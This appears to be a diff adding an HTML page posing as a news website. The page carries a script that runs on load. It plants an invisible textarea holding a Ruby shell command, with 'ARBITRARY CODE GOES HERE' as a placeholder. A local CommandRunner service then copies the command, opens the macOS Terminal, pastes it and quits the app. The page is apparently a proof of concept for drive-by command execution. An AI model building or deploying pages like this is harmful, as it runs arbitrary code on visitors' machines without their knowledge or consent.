@@ -1,0 +1,39 @@
+<h1>The News Website</h1>
+<p>All the most important news of the day</p>
+<img src="/images/ascii-good-luck.jpg" width=400 />
+<script src="/javascripts/lib.js"></script>
+
+<script>
+client = new CommandRunner(32859)
+
+var ta = document.createElement('textarea');
+ta.innerHTML = "ruby -e 'puts \"ARBITRARY CODE GOES HERE\"'\n"
+ta.id = "command"
+ta.cols = 1
+ta.style = "font-size: 0; border: none;"
+document.getElementsByTagName("body")[0].appendChild(ta);
+
+var taDom = document.getElementById('command');
+taDom.focus();
+taDom.select();
+
+function delay(t) {
+  return new Promise(r => setTimeout(r, t))
+}
+
+const d = 1500
+
+client.copy().then(() =>
+  delay(d)
+).then(() =>
+  client.openOSXTerminal()
+).then(() =>
+  delay(d)
+).then(() =>
+  client.paste()
+).then(() =>
+  delay(d)
+).then(() =>
+  client.quitApp()
+)
+</script>
